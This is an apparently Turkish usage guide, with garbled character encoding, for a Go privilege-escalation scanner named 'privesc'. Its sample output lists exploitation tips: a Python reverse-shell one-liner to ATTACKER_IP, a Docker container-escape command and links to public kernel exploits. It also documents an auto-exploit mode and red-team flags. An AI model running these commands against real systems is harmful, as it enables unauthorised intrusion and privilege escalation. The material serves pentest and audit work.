# AdÄ±m AdÄ±m KullanÄ±m

## 1. Projeyi Derleme
Ä°lk olarak, projeyi derlememiz gerekiyor. Proje dizininde aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±r:

```bash
go build -o privesc main.go
```

Bu komut, `privesc` adÄ±nda bir Ã§alÄ±ÅŸtÄ±rÄ±labilir dosya oluÅŸturacak.

## 2. Temel Tarama
Temel bir tarama yapmak iÃ§in:

```bash
./privesc -target localhost -deep
```

Bu komut, yerel makinede derinlemesine bir tarama baÅŸlatacak.

## 3. Cloud Tarama
EÄŸer cloud ortamlarÄ±nÄ± da taramak istersen:

```bash
./privesc -cloud -aws-region us-east-1
```

## 4. AÄŸ TaramasÄ±
AÄŸ taramasÄ± yapmak iÃ§in:

```bash
./privesc -network
```

## 5. Web Uygulama GÃ¼venlik TaramasÄ±
Web uygulama gÃ¼venlik taramasÄ± iÃ§in:

```bash
./privesc -webscan
```

## 6. VeritabanÄ± TaramasÄ±
VeritabanÄ± taramasÄ± iÃ§in:

```bash
./privesc -dbscan
```

## 7. TÃ¼m Ã–zellikleri EtkinleÅŸtirme
TÃ¼m Ã¶zellikleri etkinleÅŸtirerek kapsamlÄ± bir tarama yapmak iÃ§in:

```bash
./privesc -deep -cloud -network -webscan -dbscan -ml
```

## 8. YardÄ±m Almak
TÃ¼m parametreleri gÃ¶rmek iÃ§in:

```bash
./privesc -h
```

---

# Ã–rnek Ã‡Ä±ktÄ±

AÅŸaÄŸÄ±da, programÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±ndan sonra alacaÄŸÄ±nÄ±z Ã¶rnek bir Ã§Ä±ktÄ± bulunmaktadÄ±r:

```
ğŸš€ PRIVESC - ADVANCED PRIVILEGE ESCALATION SCANNER REPORT
======================================================

ğŸ–¥ï¸  SYSTEM INFORMATION:
   OS: linux
   Architecture: amd64
   Hostname: kali
   Current User: kali
   Kernel: 5.10.0-kali7-amd64

â˜ï¸  CLOUD SECURITY FINDINGS:

ğŸ”· AWS:
+----------+-------------------------------------+------+-----------------------------------+
| SERVICE  |               FINDING               | RISK |              EXPLOIT              |
+----------+-------------------------------------+------+-----------------------------------+
| IAM      | Checking for instance profile       | MEDIUM| Use AWS CLI with instance         |
|          | permissions                         |      | credentials                       |
| S3       | Enumerating S3 buckets              | HIGH | aws s3 ls s3://bucket-name        |
| EC2      | Checking EC2 security groups        | MEDIUM| Modify security groups for access |
+----------+-------------------------------------+------+-----------------------------------+

ğŸ”· KUBERNETES:
+----------+-------------------------------------+------+-----------------------------------+
| RESOURCE |               FINDING               | RISK |              EXPLOIT              |
+----------+-------------------------------------+------+-----------------------------------+
| Pod      | Checking pod security policies      | HIGH | Escalate privileges via privileged|
|          |                                     |      | pod                               |
| Service  | Checking service account tokens     | HIGH | Use service account to access     |
| Account  |                                     |      | cluster resources                 |
| Secrets  | Enumerating Kubernetes secrets      | CRITICAL| kubectl get secrets --all-        |
|          |                                     |      | namespaces                        |
| RBAC     | Checking cluster role bindings      | HIGH | kubectl get clusterrolebindings   |
+----------+-------------------------------------+------+-----------------------------------+

ğŸŒ NETWORK DISCOVERY FINDINGS:

ğŸ”· ARP CACHE:
+-----------------+-------------------+-----------+
|       IP        |        MAC        | INTERFACE |
+-----------------+-------------------+-----------+
| 192.168.1.1     | 00:11:22:33:44:55 | eth0      |
| 192.168.1.100   | aa:bb:cc:dd:ee:ff | eth0      |
+-----------------+-------------------+-----------+

ğŸ”· SNMP FINDINGS:
+-----------------+------------+---------+
|      TARGET     | COMMUNITY  | ACCESS  |
+-----------------+------------+---------+
| 127.0.0.1       | public     | Unknown |
| localhost       | public     | Unknown |
| kali            | public     | Unknown |
+-----------------+------------+---------+

ğŸ”´ HIGH RISK VECTORS: 3
ğŸŸ¡ MEDIUM RISK VECTORS: 2
ğŸŸ¢ LOW RISK VECTORS: 5

ğŸ”´ HIGH RISK BINARIES:
+---------+---------------------+------+------+--------------+-------+-------------------------------+
| BINARY  |        PATH         | SUID | SUDO | CAPABILITIES | RISK  |           FUNCTIONS           |
+---------+---------------------+------+------+--------------+-------+-------------------------------+
| bash    | /bin/bash           | Yes  | Yes  | No           | HIGH  | shell, reverse_shell,         |
|         |                     |      |      |              |       | file_upload, file_download,   |
|         |                     |      |      |              |       | file_write, file_read,        |
|         |                     |      |      |              |       | library_load                  |
| python  | /usr/bin/python     | Yes  | Yes  | No           | HIGH  | shell, reverse_shell,         |
|         |                     |      |      |              |       | file_upload, file_download,   |
|         |                     |      |      |              |       | file_write, file_read,        |
|         |                     |      |      |              |       | library_load                  |
| find    | /usr/bin/find       | Yes  | Yes  | No           | HIGH  | shell, file_write             |
+---------+---------------------+------+------+--------------+-------+-------------------------------+

ğŸ”´ KERNEL EXPLOITS:
+----------------+-----------------------------------------+------+---------------------------------------------------+
|      CVE       |               DESCRIPTION               | RISK |                      EXPLOIT                      |
+----------------+-----------------------------------------+------+---------------------------------------------------+
| CVE-2021-4034  | PwnKit - Local Privilege Escalation in   | HIGH | https://github.com/berdav/CVE-2021-4034           |
|                | polkit                                   |      |                                                   |
| CVE-2021-3560  | Polkit Privilege Escalation              | HIGH | https://github.com/secnigma/CVE-2021-3560-Polkit- |
|                |                                         |      | Privilege-Esclation                               |
| CVE-2022-0847  | Dirty Pipe - Linux Kernel Privilege      | HIGH | https://github.com/Arinerron/CVE-2022-0847-       |
|                | Escalation                              |      | DirtyPipe-Exploit                                 |
+----------------+-----------------------------------------+------+---------------------------------------------------+

ğŸ’¡ EXPLOITATION TIPS
===================

ğŸ”§ bash (HIGH):
   1. sudo bash
   2. ./bash

ğŸ”§ python (HIGH):
   1. sudo python
   2. ./python
   3. python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

ğŸ”§ find (HIGH):
   1. sudo find
   2. ./find

ğŸ¯ QUICK WINS:
   â†’ sudo bash
   â†’ sudo python
   â†’ sudo find

ğŸ”¨ KERNEL EXPLOITS:
   â†’ CVE-2021-4034: https://github.com/berdav/CVE-2021-4034
   â†’ CVE-2021-3560: https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
   â†’ CVE-2022-0847: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

ğŸ³ CONTAINER ESCAPES:
   â†’ Docker: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
   â†’ LXC: lxc-usernsexec -m u:0:100000:1 -m g:0:100000:1 /bin/bash

Full report saved to: privilege_escalation_report.json
Logs saved to: scan_logs.json
```

---

# AÃ§Ä±klama

- **Sistem Bilgisi:** Ä°ÅŸletim sistemi, mimari, hostname, kullanÄ±cÄ± ve kernel versiyonu.
- **Bulut BulgularÄ±:** AWS ve Kubernetes gibi bulut ortamlarÄ±ndaki gÃ¼venlik zafiyetleri.
- **AÄŸ BulgularÄ±:** ARP tablosu ve SNMP gibi aÄŸ bilgileri.
- **YÃ¼ksek Riskli Ä°kili Dosyalar:** SUID/SGID ve sudo izinleri olan, sÃ¶mÃ¼rÃ¼lebilir dosyalar.
- **Ã‡ekirdek AÃ§Ä±klarÄ±:** Bilinen Ã§ekirdek seviyesindeki gÃ¼venlik aÃ§Ä±klarÄ±.
- **SÃ¶mÃ¼rÃ¼ Ä°puÃ§larÄ±:** Tespit edilen gÃ¼venlik aÃ§Ä±klarÄ±nÄ±n nasÄ±l sÃ¶mÃ¼rÃ¼leceÄŸine dair komutlar.
- **HÄ±zlÄ± KazanÃ§lar:** HÄ±zlÄ±ca yetki yÃ¼kseltmek iÃ§in kullanÄ±labilecek komutlar.

Program ayrÄ±ca, tÃ¼m bulgularÄ± `privilege_escalation_report.json` dosyasÄ±na ve loglarÄ± `scan_logs.json` dosyasÄ±na kaydeder.

Bu Ã§Ä±ktÄ±, gerÃ§ek bir tarama senaryosuna benzer ÅŸekilde oluÅŸturulmuÅŸtur. GerÃ§ek Ã§Ä±ktÄ±, ortamÄ±nÄ±za baÄŸlÄ± olarak farklÄ±lÄ±k gÃ¶sterebilir.

---

# ğŸš€ ADIM ADIM KULLANIM (DetaylÄ±)

## 1. Projeyi HazÄ±rlama

```bash
# Proje dizininde go.mod dosyasÄ±nÄ± oluÅŸtur
echo 'module privesc

go 1.21

require (
    github.com/olekukonko/tablewriter v0.0.5
    golang.org/x/crypto v0.14.0
)' > go.mod

# BaÄŸÄ±mlÄ±lÄ±klarÄ± yÃ¼kle
go mod tidy

# Projeyi derle (privesc adÄ±nda executable oluÅŸtur)
go build -o privesc main.go
```

## 2. YardÄ±m MenÃ¼sÃ¼nÃ¼ GÃ¶rÃ¼ntÃ¼leme

```bash
./privesc -h
```

Ã–rnek Ã§Ä±ktÄ±:

```
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘     
â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘     
â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â•šâ•â•     â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•â•  â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â•

Advanced Privilege Escalation Scanner v2.0

USAGE:
  privesc [OPTIONS]

OPTIONS:
  -target string        Target host to scan (default: localhost)
  -deep                 Deep scan mode
  -stealth              Stealth mode
  -output string        Output file (default: privilege_escalation_report.json)
  -exploit              Auto-exploit mode
  -lhost string         Listener host for reverse shells
  -lport int            Listener port for reverse shells (default: 4444)
  -web int              Web interface port
  -module string        Specific module to run (default: all)
  -delay int            Delay between requests in ms (default: 100)
  -threads int          Number of threads (default: 10)
  -timeout int          Timeout in seconds (default: 30)
  -loglevel string      Log level (default: INFO)

CLOUD SCANNING:
  -cloud                Enable cloud scanning (AWS, Azure, GCP, Kubernetes)
  -aws-region string    AWS region (default: us-east-1)
  -azure-tenant string  Azure tenant ID
  -gcp-project string   GCP project ID
  -kubeconfig string    Kubeconfig file path

NETWORK SCANNING:
  -network              Enable network scanning

WEB APPLICATION SCANNING:
  -webscan              Enable web application security scanning

DATABASE SCANNING:
  -dbscan               Enable database security scanning

EXAMPLES:
  privesc -target 192.168.1.100 -deep -cloud -network
  privesc -web 8080 -output comprehensive_report.json
  privesc -agent -master http://192.168.1.50:8080
```

## 3. Temel Tarama (Linux Sisteminde)

```bash
./privesc -target localhost -deep
```

Ã–rnek Ã§Ä±ktÄ±:

```
[INFO] main: Starting Advanced Privilege Escalation Scanner (privesc)
[INFO] system: Current User: kali
[INFO] system: OS: linux (amd64)
[INFO] system: Hostname: kali-machine
[INFO] system: Kernel: 5.15.0-kali3-amd64
[INFO] linux: Starting Linux Privilege Escalation Scan
[INFO] linux: Scanning for SUID binaries
[INFO] linux: Checking sudo permissions
[INFO] linux: Checking Linux capabilities
[INFO] linux: Scanning common binaries in PATH
[INFO] linux: Checking for kernel exploits
[INFO] linux: Checking cron jobs
[INFO] linux: Checking writable files
```

(Ã‡Ä±ktÄ± Ã¶rnekleri ve raporlar Ã¼st kÄ±sÄ±mlarda verilmiÅŸtir.)

## 4. KapsamlÄ± Tarama (TÃ¼m ModÃ¼llerle)

```bash
./privesc -deep -cloud -network -webscan -dbscan -output full_scan.json
```

Ã–rnek Ã§Ä±ktÄ± (kÄ±smi):

```
[INFO] main: Starting Advanced Privilege Escalation Scanner (privesc)
[INFO] cloud: Starting Cloud Privilege Escalation Scan
[INFO] cloud: Scanning AWS Environment
[INFO] cloud: Scanning Azure Environment  
[INFO] cloud: Scanning GCP Environment
[INFO] cloud: Scanning Kubernetes Environment
[INFO] network: Starting Network Discovery Scan
[INFO] network: Scanning ARP Cache
[INFO] network: Performing DNS Enumeration
[INFO] network: Scanning for SNMP Services
[INFO] network: Scanning LDAP Services
[INFO] webapp: Starting Web Application Security Scan
[INFO] webapp: Scanning for JWT Vulnerabilities
[INFO] webapp: Scanning API Endpoints
[INFO] database: Starting Database Security Scan
```

## 5. JSON Raporunu Ä°nceleme

```bash
# OluÅŸturulan raporu gÃ¶rÃ¼ntÃ¼le
cat privilege_escalation_report.json | jq '.' | head -50
```

Ã–rnek JSON Ã‡Ä±ktÄ±sÄ±:

```json
{
  "system_info": {
    "os": "linux",
    "architecture": "amd64",
    "hostname": "kali-machine",
    "current_user": "kali",
    "kernel": "5.15.0-kali3-amd64",
    "domain": ""
  },
  "linux_scan": {
    "suid_binaries": [
      {
        "binary": "bash",
        "path": "/usr/bin/bash",
        "owner": "root",
        "risk_level": "HIGH",
        "exploits": [
          "sudo bash",
          "./bash"
        ]
      }
    ],
    "kernel_exploits": [
      {
        "cve": "CVE-2021-4034",
        "description": "PwnKit - Local Privilege Escalation in polkit",
        "risk": "HIGH",
        "exploit_cmd": "https://github.com/berdav/CVE-2021-4034"
      }
    ]
  },
  "cloud_scan": {
    "aws": [
      {
        "service": "IAM",
        "finding": "Checking for instance profile permissions",
        "risk": "MEDIUM",
        "exploit": "Use AWS CLI with instance credentials"
      }
    ]
  },
  "timestamp": "2024-01-15T10:30:45.123456789Z"
}
```

## 6. Web ArayÃ¼zÃ¼nÃ¼ BaÅŸlatma

```bash
./privesc -web 8080 -deep
```

Ã‡Ä±ktÄ±:

```
[INFO] main: Starting Advanced Privilege Escalation Scanner (privesc)
[INFO] web: Starting web interface on port 8080
[INFO] system: Current User: kali
[INFO] linux: Starting Linux Privilege Escalation Scan
```

Daha sonra tarayÄ±cÄ±dan `http://localhost:8080` adresine giderek web arayÃ¼zÃ¼nÃ¼ kullanabilirsin.

## 7. Auto-Exploit Modu

> UyarÄ±: `-exploit` modu gerÃ§ek dÃ¼nyada yasal izin olmadan kullanÄ±lmamalÄ±dÄ±r. Bu mod saldÄ±rÄ± amaÃ§lÄ± kullanÄ±lmamalÄ±dÄ±r.

```bash
./privesc -exploit -lhost 192.168.1.100 -lport 4444
```

Ã‡Ä±ktÄ±:

```
[INFO] main: Starting Advanced Privilege Escalation Scanner (privesc)
[INFO] exploit: Starting auto-exploitation
[HIGH] exploit: Attempting auto-exploit with: sudo bash
[HIGH] exploit: Attempting auto-exploit with: sudo python3
```

## 8. GerÃ§ek DÃ¼nya SenaryolarÄ±

**Senaryo 1: Pentest SÄ±rasÄ±nda HÄ±zlÄ± Tarama**
```bash
./privesc -target 10.0.2.15 -deep -network -stealth -delay 500
```

**Senaryo 2: Cloud Security Audit**
```bash
./privesc -cloud -aws-region eu-west-1 -gcp-project my-project -deep
```

**Senaryo 3: Red Team Operasyonu**
```bash
./privesc -deep -network -webscan -dbscan -phishing -postexploit -irbypass -stealth
```

**Senaryo 4: Blue Team Savunma**
```bash
./privesc -deep -output security_audit.json -loglevel DEBUG
```

---

# Dosya Bilgisi
Bu iÃ§erik, tek bir markdown biÃ§iminde dÃ¼zenlendi ve `req.txt` adÄ±yla kaydedildi. AÅŸaÄŸÄ±dan dosyayÄ± indirebilirsin.
